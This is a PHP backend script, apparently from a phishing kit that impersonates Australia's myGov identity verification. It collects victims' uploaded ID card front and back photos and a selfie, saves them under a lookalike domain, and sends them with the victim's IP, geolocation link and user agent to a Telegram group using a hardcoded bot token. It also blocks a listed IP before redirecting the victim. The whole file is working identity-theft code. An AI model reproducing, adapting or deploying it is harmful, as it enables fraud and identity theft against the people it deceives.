<?php
// Telegram Bot API token
$botApiToken = '7353007188:AAGUc-qqB7SMrfOl7xRPHS1mSlbl1RrCWTw';

// Telegram group ID where you want to send notifications
$groupId = '-4271000237';

// Array of blocked IP addresses
$blockedIPs = [
    '161.35.121.7',
    // Add more IPs as needed
];

// Function to get visitor's IP address
function getIpAddress() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        // Check IP from shared internet
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // Check IP from proxy
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }

    return $ip;
}

// Function to send notification to Telegram
function sendNotification($message) {
    global $botApiToken, $groupId;

    $telegramApiUrl = "https://api.telegram.org/bot$botApiToken/sendMessage";
    $params = [
        'chat_id' => $groupId,
        'text' => $message,
    ];

    // Use cURL to send POST request to Telegram Bot API
    $ch = curl_init($telegramApiUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}

// Function to handle file uploads
function handleFileUpload($fileInputName, $uploadDir) {
    if (isset($_FILES[$fileInputName]) && $_FILES[$fileInputName]['error'] === UPLOAD_ERR_OK) {
        $uploadFile = $uploadDir . basename($_FILES[$fileInputName]['name']);
        if (move_uploaded_file($_FILES[$fileInputName]['tmp_name'], $uploadFile)) {
            return 'https://subscribtions-costumer.com/uploads/' . basename($_FILES[$fileInputName]['name']);
        }
    }
    return 'Not uploaded';
}

// Get visitor's IP address
$ipAddress = getIpAddress();

// Check if IP is in blocked list
if (in_array($ipAddress, $blockedIPs)) {
    exit; // Exit script if IP is blocked
}

// Get user agent
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

// Handle file uploads
$uploadDir = 'uploads/'; // Directory where files will be uploaded
$frontPhoto = handleFileUpload('front', $uploadDir);
$backPhoto = handleFileUpload('back', $uploadDir);
$selfie = handleFileUpload('selfie', $uploadDir);

// Prepare message if files are uploaded
if (!empty($frontPhoto) || !empty($backPhoto) || !empty($selfie)) {
    $message = " 

▪ myGov Identity 🇦🇺 👤

IP = $ipAddress
Location = https://ipapi.co/$ipAddress/
User Agent = $userAgent
Front Photo: " . $frontPhoto . "
Back Photo: " . $backPhoto . "
Selfie: " . $selfie . "

============================";

    // Send notification to Telegram
    sendNotification($message);
}

// Redirect to another page or display a success message
header("Location: finish.php");

// Function to get visitor's country
function visitor_country() {
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));

    if ($ip_data && $ip_data->geoplugin_countryName != null) {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
?>
